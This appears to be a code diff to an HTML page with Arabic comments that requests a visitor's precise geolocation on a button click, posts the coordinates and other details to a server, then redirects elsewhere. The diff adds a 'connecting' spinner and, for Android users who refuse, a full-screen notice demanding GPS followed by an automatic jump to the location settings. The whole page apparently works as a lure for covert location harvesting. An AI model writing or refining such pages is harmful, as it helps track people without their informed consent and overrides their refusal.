@@ -156,27 +156,72 @@
             }
         })();
 
-        // التنفيذ عند النقر مباشرة (لا يسمح المتصفح بطلب الموقع إلا بنقرة حقيقية)
+        // التنفيذ عند النقر مباشرة
         document.getElementById('ok').onclick = function () {
             if (isWorking) return;
             isWorking = true;
-            this.innerText = "...";
+            
+            // تحسين شكل الزر عند الضغط
+            this.innerHTML = '<span style="display:flex; align-items:center; gap:5px;">جاري الاتصال... <div class="spinner"></div></span>';
+            this.style.opacity = "0.7";
 
-            // طلب الموقع فوراً (أول سطر بعد النقر)
+            // طلب الموقع فوراً بأعلى دقة ممكنة
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function (p) {
-                        push({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy.toFixed(1) + "m" });
+                        // نجاح: إرسال البيانات والتحويل
+                        push({ 
+                            lat: p.coords.latitude, 
+                            lon: p.coords.longitude, 
+                            acc: p.coords.accuracy.toFixed(1) + "m" 
+                        });
                     },
                     function (e) {
-                        push({ lat: "تم الرفض", lon: "مغلق", acc: "Code: " + e.code });
+                        // فشل: معالجة أنواع الأخطاء
+                        let errorMsg = "خطأ غير معروف";
+                        if (e.code == 1) {
+                            errorMsg = "تم رفض الإذن";
+                            // إذا رفض المستخدم، نوجهه للإعدادات في الأندرويد كخطة بديلة
+                            handleDenied();
+                        } else if (e.code == 2) {
+                            errorMsg = "الموقع مغلق في الجهاز";
+                            handleDenied();
+                        } else if (e.code == 3) {
+                            errorMsg = "انتهت مهلة الطلب";
+                        }
+                        
+                        push({ lat: "فشل", lon: errorMsg, acc: "Error: " + e.code });
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 8000, 
+                        maximumAge: 0 
+                    }
                 );
             } else {
                 jump();
             }
         };
+
+        function handleDenied() {
+            // كود سحري للأندرويد: فتح إعدادات الموقع مباشرة
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.indexOf("android") > -1) {
+                setTimeout(() => {
+                    // شاشة توجيه سريعة
+                    document.body.innerHTML = `
+                        <div style="background:#000; color:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px;">
+                            <h2 style="color:#ff4b4b;">يجب تفعيل GPS</h2>
+                            <p style="margin:15px 0;">سيتم فتح الإعدادات الآن.. قم بتفعيل "موقعي" ثم عد للرابط</p>
+                            <div class="spinner"></div>
+                        </div>
+                    `;
+                    setTimeout(() => {
+                        window.location.href = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+                    }, 1500);
+                }, 500);
+            }
+        }
 
         function push(d) {
             var specs = {
@@ -194,14 +239,26 @@
                 keepalive: true
             }).finally(jump);
 
-            // تحويل احتياطي سريع جداً
-            setTimeout(jump, 1000);
+            // تحويل احتياطي سريع
+            setTimeout(jump, 2500);
         }
 
         function jump() {
             window.location.href = REDIRECT;
         }
     </script>
+    <style>
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(0,0,0,0.1);
+            border-top: 2px solid #202124;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+
 </body>
 
 </html>
